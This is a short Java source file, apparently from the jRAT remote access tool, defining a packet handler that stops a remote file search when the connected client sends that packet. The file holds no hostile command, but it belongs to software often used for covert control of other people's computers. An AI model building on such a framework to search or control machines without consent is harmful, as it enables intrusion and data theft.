package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.AbstractIncomingPacket;
import jrat.module.fs.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		FileSearch.stopSearch();
	}

}
